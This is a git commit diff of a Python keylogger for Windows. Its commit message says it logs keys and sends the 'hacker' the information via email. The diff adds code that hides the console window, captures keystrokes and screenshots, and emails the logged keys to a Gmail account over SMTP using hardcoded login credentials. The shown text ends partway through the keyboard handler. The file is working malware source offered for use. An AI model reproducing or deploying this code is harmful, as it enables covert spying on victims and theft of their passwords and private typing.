d371c191e3d3665c14bc58474921961e6bc9fd0e
Wembley Williams <wembleywilliams@gmail.com>
2017-12-18 21:04:10 -0500

    Keylogger V1.4
    Keylogger features
     - Logs keys to a local file
     - Sends hacker the information via email

--- Keylogger.py
+++ Keylogger.py
@@ -1,59 +1,68 @@
 import pyHook,pythoncom,sys
+import os
+import win32gui
+import win32console
 import smtplib
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
+from email.mime.image import MIMEImage
 from email import encoders
 import getpass
 import autopy
 
-file_log = open('C:\\Users\\wembl\\Desktop\\keys.txt','w+')
+win = win32console.GetConsoleWindow()
+win32gui.ShowWindow(win, 0)
+
+file_log = open('keys.txt','w+')
 buffer = file_log.read()
 file_log.close()
+
 user = getpass.getuser()
+
+imagefile = 'screenshot_of_' + user + '.png'
 
 def screenCapture():
     bitmap = autopy.bitmap.capture_screen()
-    bitmap.save('C:\\Users\\wembl\\Desktop\\screenshot_of_'+ user+'.png')
+    bitmap.save('screenshot_of_' + user + '.png')
 
 def sendEmail(keyMessage):
     try:
-        attachment = open('C:\\Users\\wembl\\Desktop\\screenshot_of_'+ user+'.png','rb')
-        part = MIMEBase('application','octet-stream')
-        part.set_payload(attachment.read())
-        encoders.encode_base64(part)
-        part.add_header('Content-Disposition',"attachment;filename= "+file_log)
+
+        msg = MIMEMultipart()
         fromaddr = 'keyhunter.hackspc@gmail.com'
         username = 'hackdemdead@gmail.com'
         password = 'leonardo19'
-        keyMessage += "<br><br>" + "Keys have been logged master"
-        msg = MIMEMultipart()
-        msg.attach(part)
-        msg.attach(MIMEText(keyMessage,'html'))
+
         msg['Subject'] = "Keys Logged From User: " + user
         msg['Reply-to'] = 'no-reply'
         msg['To'] = 'hackdemdead@gmail.com'
+
+        keyMessage += "<br><br>" + "Keys have been logged master"
+
+        msg.attach(MIMEText(keyMessage,'html'))
+
         server = smtplib.SMTP('smtp.gmail.com:587')
         server.starttls()
         server.login(username, password)
         server.sendmail(fromaddr, ['hackdemdead@gmail.com'], msg.as_string())
         server.quit()
-
+#
     except:
         print "Error sending email to hacker!!!"
 
     return True
 
 def OnKeyboardEvent(event):
-    file_log = open('C:\\Users\\wembl\\Desktop\\keys.txt','r+')
+    file_log = open('keys.txt','r+')
     buffer = file_log.read()
     file_log.close()
-    if len(buffer) > 500:
-        sendEmail(buffer[-1000:].replace("\n", "<br>"))
+    if len(buffer) > 10:
         screenCapture()
+        sendEmail(buffer[-1000:].replace("\n", "<br>"))
         sys.exit
 
-    file_log = open('C:\\Users\\wembl\\Desktop\\keys.txt',  'w')
+    file_log = open('keys.txt',  'w')
     keylogs = chr(event.Ascii)
     # if user press ENTER
     if event.Ascii == 13:
